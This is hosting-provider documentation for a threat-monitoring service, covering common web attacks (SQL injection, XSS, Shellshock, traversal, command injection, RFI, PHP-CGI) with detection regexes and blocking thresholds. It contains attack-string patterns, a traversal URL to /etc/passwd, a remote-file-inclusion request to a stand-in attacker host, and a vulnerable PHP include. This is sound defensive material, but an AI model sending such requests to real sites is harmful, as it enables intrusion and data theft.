# Common Web Attacks

Web attacks are perhaps one of the most common attacks on Internet-facing systems, and they're only becoming more of a danger. UKFast's Threat Monitoring has a range of rules dedicated to detecting and blocking common web-based attacks and malicious connection attempts.

## SQL Injection

**What is this attack**

Making malicious connections to your database, SQL  attacks are designed to utilise your web applications to run arbitrary SQL queries against your database. As these queries are run by your web application, they can bypass existing security controls and NAC. SQL Injections can take advantage of many different attack vectors, one of the most common is web queries as they tend to sit close to other services and have privileged access to databases.

**Signatures detected**

Triggered when the URL request contains any of the flowing patterns:

*Patterns are separated by a |*

***MySQL***

Regex:  ```select%20 | select+ | insert%20 | %20from%20 | % 20where%20 | union%20 | union+ | where+ |null,null | xp_cmdshell | +as+varchar | %2Bchar\(\d+\)%2Bchar\(\d+\)%2Bchar\(\d+\)%2Bchar\(\d+\)%2Bchar\(\d+\)%2Bchar\(\d+\) | =%27 | select%2B | insert%2B | %2Bfrom%2B | %2Bwhere%2B | %2Bunion%2B | %EF%BC%87 | %EF%BC%87 | %EF%BC%87 | %2531 | %u0053%u0045 | 0x7b5d ```

***MSSQL***

Regex: ```%2Bchar\(\d+\)%2Bchar\(\d+\)%2Bchar\(\d+\)%2Bchar\(\d+\)%2Bchar\(\d+\)%2Bchar\(\d+\)```

**Severity**

Although dangerous, Threat Monitoring will not immediately block an IP if a SQL injection is detected. This is to prevent more advanced, legitimate web queries from immediately being blocked. If an IP continues to submit SQL injection requests, the IP will be blocked, see the 'Remediations and blocking' section below

**Remediation and Blocking**

Threat Monitoring will block the IP of 8 or more SQL Injection signatures are detected within 120 seconds. The IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

Additionally, If an XSS attack returns a code 200 (Web Request success), Threat Monitoring will check the source IP address against AbuseIPDB. If the IP is known for malicious activity within the last 14 days, the IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.


Attackers will commonly try SQL injections on your site, the best ways to prevent these attacks from being successful are:
* Ensure your database is not directly accessible via the Internet
* Sanitize  your data inputs on any custom built web applications
* Use high-quality code from trusted sources
* Always update to the latest web application version
* Perform regular database audits


## XSS (Cross Site Scripting)

**What is this attack**

XSS  (Cross Site Scripting) attacks are similar to SQL injections but instead, XSS attacks utilise JavaScript runs on a user's machine to execute an attack. Through an XSS exploit, an attacker could place malicious JavaScript code on your website that would be run by every use that visits the web pages affected the attacker's malicious code. This code could steal information or even corrupt what data is sent to the user, allowing the attacker to gain an advantage.

**Signatures detected**

Triggered when the URL request contains any of the flowing patterns:

*Patterns are separated by a |*

Regex: ```%3Cscript | %3C%2Fscript | script> | script%3E | SRC=javascript | IMG%20 | %20ONLOAD= | INPUT%20 | iframe%20```


**Severity**

Although dangerous, Threat Monitoring will not immediately block an IP if an XSS attack is detected. This is to prevent more advanced, legitimate web queries from immediately being blocked. If an IP continues to submit XSS requests, the IP will be blocked, see the 'Remediations and blocking' section below

**Remediation and Blocking**

Threat Monitoring will block the IP if 10 or more XSS Injection signatures are detected within 120 seconds. The IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

Additionally, If an XSS attack returns a code 200 (Web Request success), Threat Monitoring will check the source IP address against AbuseIPDB. If the IP is known for malicious activity within the last 14 days, the IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.


Attackers will commonly try XSS  injections on your site, the best ways to prevent these attacks from being successful are:

* Sanitize  your data inputs on any custom built web applications
* Use high-quality code from trusted sources
* Always update to the latest web application version
* Perform regular code audits

## Shellshock Attack (CVE-2014-6271)


**What is this attack**

Taking advantage of web servers, a Shellshock attack has the potential to allow an attacker to arbitrary code on a system. A shellshock attack commonly targets web servers with CGI (Common Gateway Interface) enabled, a system that is used for created dynamic web content. Through a vulnerable CGI, an attacker could send sending malformed or corrupt environment variables to a server's bash terminal, running the attacker's commands.

**Signatures detected**

Triggered when the URL request contains any of the flowing patterns:

*Patterns are separated by a |*

Regex: ```"\(\)\s*{\s*_;\.*}\s*>_[\$\(\$\(\)\)]\s*{ | "\(\)\s*{\s*:;\s*}\s*; | "\(\)\s*{\s*foo:;\s*}\s*; | "\(\)\s*{\s*ignored;\s*}\s* | "\(\)\s*{\s*gry;\s*}\s*;```

**Severity**

Rated 10/10 for severity by NIST (National Institute of Standards and Technology) a shell shock attack certainly has the potential to cause damage. If no action is taken to prevent against this attack, then your server could be left open to a very common and very exploitable attack that easily allows attackers access to your server.

Threat Monitoring assignees shellshock attacks level 15 severity.

**Remediation and Blocking**

As this alert is high severity, Threat Monitoring will automatically block the source IP address of any web request that is detected to be attempting a shell shock attack.

To protect against this vulnerability, you should ensure that your system is up-to-date and that preventative measures (like Threat Monitoring) are in place.

Many vulnerability scanners will run a non-malicious shellshock attack against a target system, as a result, false positive alerts may trigger when an ASV's system scans your server.

## Directory Traversal

**What is this attack**

Another common web attack is a directory traversal attack, an exploit that attempts to access files on your server not imminently accessible through a web interface. This attack takes advantage of insecure file permissions and web requests that have not been sanitized. This exploit could allow an attacker to view the '/etc/passwd' file of your server for example, or access directories contain sensitive information like payment gateway details or credentials.

Directory traversal attacks can be detected by monitoring for web requests that seem to be navigating up to parent directories. For example, if our website is located at /var/www/html, an attacker could utilise this attack to access our /etc/passwd files with https://website.com/../../../../etc/passwd.

**Signatures detected**

Triggered when the URL request contains any of the flowing patterns:

*Patterns are separated by a |*

Regex: ```%027 | %00 | %01 | %7f | %2E%2E | %0A | %0D | ../..|..\.. | echo; | ../..// | %5C../%5C | ././././ | 2e%2e%5c%2e | \x5C\x5C```

**Severity**

Although dangerous, Threat Monitoring will not immediately block an IP if a Directory Traversal attack is detected. This is to prevent more advanced, legitimate web queries from immediately being blocked. If an IP continues to submit Directory Traversal requests, the IP will be blocked, see the 'Remediations and blocking' section below

**Remediation and Blocking**

Threat Monitoring will block the IP if 10 or more Directory Traversal signatures are detected within 120 seconds. The IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

Additionally, If a Directory Traversal attack returns a code 200 (Web Request success), Threat Monitoring will check the source IP address against AbuseIPDB. If the IP is known for malicious activity within the last 14 days, the IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

## Command Injection

**What is this attack**

Requiring little introduction, this type of attack is when an attacker attempts to run commands on your server through malicious or malformed web requests. This can be especially dangerous if your web server does not properly sanitize inputs, or if your web server runs a privileged user.

For example, PHP naively supports a function to execute a string of text as a command on the host system this function, exec, can very useful when creating legitimate code, but it can also be easily exploited to run malicious code if not protected against or properly managed.

**Signatures detected**

Triggered when the URL request contains any of the flowing patterns:

*Patterns are separated by a |*

Regex: ```cmd.exe | root.exe | _mem_bin | msadc | /winnt/ | /boot.ini | /x90/ | default.ida | /sumthin | nsiislog.dll | chmod% |wget% | cd%20 | exec%20```

**Severity**

Although dangerous, Threat Monitoring will not immediately block an IP if a Command Injection attack is detected. This is to prevent more advanced, legitimate web queries from immediately being blocked. If an IP continues to submit Command Injection requests, the IP will be blocked, see the 'Remediations and blocking' section below

**Remediation and Blocking**

Threat Monitoring will block the IP if 10 or more Command Injection signatures are detected within 120 seconds. The IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

Additionally, If a Command Injection attack returns a code 200 (Web Request success), Threat Monitoring will check the source IP address against AbuseIPDB. If the IP is known for malicious activity within the last 14 days, the IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

## Remote file inclusion (RFI)

**What is this attack**

RFI (Remote file inclusion) is a technique used by attackers that take advantage of existing web server capabilities to include an attacker's malicious code that is hosted elsewhere on the Internet. This is exploited by tricking a web server that 'includes' code from other files/variables to instead loading it from an attacker's malicious server.

For example, let's say you have a PHP based web page that includes a header from a secure server in every page, the variable that stores the location of the header file is called 'header'. In your PHP code, you have the below:

```php
$header = $_GET['https://mysecureserver.com.files/header.php'];

include($header);

```

If not properly caught, an attacker could submit a request like this:

`https://yourwebsite.com/?header=http://attackersserver.com/malicouscode.php`

This would overwrite your header variable with their attackers, and the server would then include the attacker PHP code on your server and then run it.


**Signatures detected**

Triggered when the URL request contains any of the flowing patterns:

*Patterns are separated by a |*

Regex: ```?\S+=http://\d+.\d+.\d+.\d+/\S+ | ?\S+=https://\d+.\d+.\d+.\d+/\S+```


**Severity**

Although dangerous, Threat Monitoring will not immediately block an IP if an RFI attack is detected. This is to prevent more advanced, legitimate web queries from immediately being blocked. If an IP continues to submit RFI requests, the IP will be blocked, see the 'Remediations and blocking' section below

**Remediation and Blocking**

Threat Monitoring will block the IP if 10 or more RFI signatures are detected within 120 seconds. The IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

Additionally, If an RFI attack returns a code 200 (Web Request success), Threat Monitoring will check the source IP address against AbuseIPDB. If the IP is known for malicious activity within the last 14 days, the IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

To disable the ability to include remote files completely, you can set `allow_url_include` to `off` in your php.ini or .htaccess file

## POST Bots

**What is this attack**

The Internet is full of bots, both performing tasks that make the Internet run, and sometimes malicious tasks that can cause mayhem. POST requests are types of web requests that can be sent to a server via HTTP and HTTPS and are often used to send data to a web server or API.

**Severity**

POST request bots are not specifically dangerous, but detecting them can be a vital way to prevent an upcoming attack, stop a malicious vulnerability scan or stop some web scrapers from submitting a request to your site. See the below section for information on blocking this attack.

**Remediation and Blocking**

Threat Monitoring will block the IP if 16 or more POST requests are detected within 20 seconds. The IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

## Malicious User Agents

**What is this attack**

Most web-based traffic will be accompanied by a user agent tag. This user agent tells that web server what type of device or software it is. For example, the Chrome 60 web browser has a user agent of:

```cirru
 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
 ```

 It looks confusing because, well, it is, but that's for another time :P

 Malicious programs will often also pass their unique user agent or the more deceptive programs may try to imitate a more common user agent like the above, but accidentally misspell some aspects. Threat Monitoring can detected many of these malicious user agents and block them. See the Remediation and Blocking section below for more information.

**Signatures detected**

Triggered when the URL request contains any of the flowing patterns:

*Patterns are separated by a |*

Regex: ```"ZmEu" |  "libwww-perl/ | "the beast" | "Morfeus | "ZmEu | "Nikto | "w3af.sourceforge.net | Jorgee" | "Proxy Gear Pro | "DataCha0s```

**Severity**

Taking more of a passive approach, this rule does not necessarily detect that an attack is in progress, but that a user is using a software/device that is commonly used for attacks. As a result of these, Threat Monitoring classified these as level 7. IPs that use malicious user agents will be blocked, but an alert will not be sent.

**Remediation and Blocking**

Threat Monitoring will block the IP if a malicious user agent is detected. The IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.


## PHP CGI-bin Vulnerabilities

**What is this attack**

According to PHP's website, "PHP is a widely-used general-purpose scripting language that is especially suited for Web development and can be embedded into HTML." When PHP is used in a CGI-based setup (such as Apache's mod_cgid), the PHP-CGI receives a processed query string parameter as command line arguments which may allow command-line switches, such as '-s', '-d' or '-c' to be passed to the PHP-CGI binary, which can be exploited to disclose source code and obtain arbitrary code execution.

An example of the -s command, allowing an attacker to view the source code of index.php is below:
http://localhost/index.php?-s

**Signatures detected**

Triggered when the URL request contains any of the flowing patterns:

*Patterns are separated by a |*

Regex: ```?-d | ?-s | ?-a | ?-b | ?-w```

**Severity**

Although dangerous, Threat Monitoring will not immediately block an IP if PHP CGI-bin Vulnerability is detected. This is to prevent more advanced, legitimate web queries from immediately being blocked. If an IP continues to submit PHP CGI-bin Vulnerability requests, the IP will be blocked, see the 'Remediations and blocking' section below

Another way to secure your site against this type of attack is to configure your site to not accept requests starting with a '-' and not containing a '=' through. A rule like the below could be used on apache sites using mod_rewrite:

```php
         RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC]
         RewriteRule ^(.*) $1? [L]
```

**Remediation and Blocking**

Threat Monitoring will block the IP if a malicious user agent is detected. The IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

## PHP Info Scans

**What is this attack**

A PHP Info file is commonly used during development and testing to show what version of PHP a server is using, and detail and extensions that are installed to add additional functionality. Sometimes, this file is left on server after they are deployed into production environments. Should an attacker gain access to this file, they would be able to see important information reassuring your server's PHP environment and tailor their attack to target your server.

**Signatures detected**

Triggered when the URL request contains any of the flowing patterns:

*Patterns are separated by a |*

Regex: ```phpinfo.php```

**Severity**

This rule will not specifically indicate an attack, but more if a reconnaissance attempt. As a result, we assign this rule a level 6 level severity score for normal activity.

**Remediation and Blocking**

Taking more of a passive approach, this rule does not necessarily detect that an attack is in progress, but version gathering may be in progress. As a result of these, Threat Monitoring classified these as level 6. This event may show up in MyUKFast, but an alert will not be sent and the IP will not be blocked.

---

```eval_rst
   .. title:: Web Attacks
   .. meta::
      :title: Web Attacks | UKFast Documentation
      :description: Guidance relating to UKFast's Threat Monitoring and Threat Response solutions
      :keywords: threat monitoring, security, compliance, ukfast, hosting, file integrity monitoring, rootkit, detection, vulnerability scan, scans, hids, intrusion detection, threat response
```
